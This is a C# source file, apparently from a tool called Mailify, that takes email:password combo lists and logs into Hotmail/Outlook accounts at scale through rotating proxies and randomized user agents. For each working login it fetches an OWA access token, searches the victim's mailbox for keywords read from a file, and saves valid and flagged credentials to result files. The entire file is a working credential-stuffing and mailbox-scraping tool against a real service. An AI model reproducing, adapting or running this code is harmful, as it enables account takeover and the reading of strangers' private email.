using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO.Compression;
using System.Text;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Web;

namespace Mailify
{
    internal class Hotmail_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new Leaf.xNet.HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    var ua = Http.RandomUserAgent();
                    req.AddHeader("User-Agent", ua);
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    req.AddHeader("Accept-Encoding", "null");
                    req.AddHeader("Referer", "https://outlook.live.com/owa/0?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMA");
                    req.AddHeader("DNT", "1");
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Upgrade-Insecure-Requests", "1");

                    var res0 = req.Get("https://outlook.live.com/owa/0?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMA&nlp=1");
                    string FIRST_REQUEST = res0.ToString();

                    var HPGID = Functions.LR(FIRST_REQUEST, "hpgid:" ,",").FirstOrDefault();
                    var UAID = req.Cookies.GetCookies(res0.Address)["uaid"].Value;
                    var FLOWTOKEN = Regex.Match(FIRST_REQUEST, "name=\"PPFT\" id=\".+?\" value=\"(.+?)\"").Groups[1].Value;
                    var LOGIN_CHECK_ADDRESS = Regex.Match(FIRST_REQUEST, "(?is:'(https://login\\.live\\.com/ppsecure/post\\.srf.+?)')").Groups[1].Value;

                    req.AllowAutoRedirect = false;
                    req.EnableEncodingContent = true;
                    req.AddHeader("Host", "login.live.com");
                    req.AddHeader("User-Agent", ua);
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    req.AddHeader("Accept-Encoding", "null");
                    req.AddHeader("Referer", $"https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=<STATE>&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup");
                    req.AddHeader("Origin", "https://login.live.com");
                    req.AddHeader("DNT", "1");
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Upgrade-Insecure-Requests", "1");

                    var res1 = req.Post(LOGIN_CHECK_ADDRESS, $"i13=1&login={credentials[0]}&loginfmt={credentials[0]}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={credentials[1]}&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={FLOWTOKEN}&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=3500", "application/x-www-form-urlencoded");
                    string SECOND_REQUEST = res1.ToString();

                    if (SECOND_REQUEST.Contains("sErrTxt:'Your account or password is incorrect."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (SECOND_REQUEST.Contains("name=\"t\" id=\"t\" value=\""))
                    {
                        var PREREQ_DETAILS_ADDRESS = Functions.LR(SECOND_REQUEST, "id=\"fmHF\" action=\"" ,"\"").FirstOrDefault();
                        var NAPEXP = Functions.LR(SECOND_REQUEST, "id=\"NAPExp\" value=\"" ,"\"").FirstOrDefault();
                        var WBIDS = Functions.LR(SECOND_REQUEST, "id=\"wbids\" value=\"" ,"\"").FirstOrDefault();
                        var PPRID = Functions.LR(SECOND_REQUEST, "id=\"pprid\" value=\"", "\"").FirstOrDefault();
                        var WBID = Functions.LR(SECOND_REQUEST, "id=\"wbid\" value=\"" ,"\"").FirstOrDefault();
                        var NAP = Functions.LR(SECOND_REQUEST, "id=\"NAP\" value=\"" ,"\"").FirstOrDefault();
                        var ANON = Functions.LR(SECOND_REQUEST, "id=\"ANON\" value=\"" ,"\"").FirstOrDefault();
                        var ANONEXP = Functions.LR(SECOND_REQUEST, "id=\"ANONExp\" value=\"" ,"\"").FirstOrDefault();
                        var T = Functions.LR(SECOND_REQUEST, "id=\"t\" value=\"" ,"\"").FirstOrDefault();

                        req.EnableEncodingContent = true;
                        req.AddHeader("user-agent", ua);
                        req.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        req.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                        req.AddHeader("accept-encoding", "null");
                        req.AddHeader("referer", "https://login.live.com/");
                        req.AddHeader("origin", "https://login.live.com");
                        req.AddHeader("dnt", "1");
                        string ok = req.Post(PREREQ_DETAILS_ADDRESS, $"NAPExp={NAPEXP}&wbids={WBIDS}&pprid={PPRID}&wbid={WBID}&NAP={NAP}&ANON={ANON}&ANONExp={ANONEXP}&t={T}", "application/x-www-form-urlencoded").ToString();

                        req.AllowAutoRedirect = false;
                        req.AddHeader("user-agent", ua);
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                        req.AddHeader("accept-encoding", "null");
                        req.AddHeader("referer", "https://outlook.live.com/");
                        req.AddHeader("action", "StartupData");
                        req.AddHeader("x-js-clienttype", "2");
                        req.AddHeader("x-js-experiment", "1");
                        req.AddHeader("x-owa-canary", "X-OWA-CANARY_cookie_is_null_or_empty");
                        req.AddHeader("x-req-source", "Mail");
                        req.AddHeader("Mail", "https://outlook.live.com");
                        req.AddHeader("dnt", "1");
                        string ok1 = req.Get("https://outlook.live.com/owa/0/startupdata.ashx?app=Mail&n=0").ToString();

                        req.AllowAutoRedirect = false;
                        req.AddHeader("user-agent", ua);
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("accept-language", "accept-language");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("referer", "https://outlook.live.com/");
                        req.AddHeader("action", "GetAccessTokenforResource");
                        req.AddHeader("x-owa-canary", req.Cookies.GetCookies("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail")["X-OWA-CANARY"].Value);
                        req.AddHeader("x-owa-urlpostdata", "%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D");
                        req.AddHeader("x-req-source", "Mail");
                        req.AddHeader("origin", "https://outlook.live.com");
                        req.AddHeader("dnt", "1");

                        string ok2 = req.Post("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail", "w", "application/json").ToString();
 
                        if (!ok2.Contains("AccessToken"))
                        {
                            Variables.combos.Enqueue(combo);
                            Variables.proxyIndex++;
                            Variables.Errors++;
                        }

                        var ACCESS_TOKEN = Functions.JSON(ok2, "AccessToken").FirstOrDefault();
                        var CVID = Guid.NewGuid().ToString();

                        foreach (string line in File.ReadAllLines("Files//Keywords.txt"))
                        {
                            req.AllowAutoRedirect = false;
                            req.AddHeader("authorization", $"Bearer {ACCESS_TOKEN}");
                            string final = req.Post("https://outlook.live.com/search/api/v1/query", "{\"Cvid\":\"" + CVID + "\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Pacific Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Provenances\":[\"Exchange\"],\"Query\":{\"QueryString\":\"" + line + "\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\"]},\"PropertySet\":\"ProvenanceOptimized\"}],\"LogicalId\":\"" + CVID + "\"}", "application/json").ToString();


                            if (final.Contains("\"ApiVersion\""))
                            {
                                var NAMES = string.Join(",", Functions.LR(final, "\"Address\":\"", "\"", true));
                                int a = Regex.Matches(NAMES, line).Count;

                                if (a == 0)
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + line + " | Results: " + a, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{line}.txt", combo + " | Keyword: " + line + " | Results: " + a + Environment.NewLine);
                                    }
                                }
                            }
                            else
                            {
                                Variables.combos.Enqueue(combo);
                                Variables.proxyIndex++;
                                Variables.Errors++;
                            }
                        
                        }
                    }
                    else if (SECOND_REQUEST.Contains("action=\"https://account.live.com/recover") || SECOND_REQUEST.Contains("action=\"https://account.live.com/Abuse") || SECOND_REQUEST.Contains("action=\"https://account.live.com/ar/cancel") || SECOND_REQUEST.Contains("action=\"https://account.live.com/identity/confirm") || SECOND_REQUEST.Contains("title>Help us protect your account") || SECOND_REQUEST.Contains("action=\"https://account.live.com/RecoverAccount") || SECOND_REQUEST.Contains("action=\"https://account.live.com/Email/Confirm") || SECOND_REQUEST.Contains("action=\"https://account.live.com/Abuse") || SECOND_REQUEST.Contains("action=\"https://account.live.com/profile/accrue"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch 
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}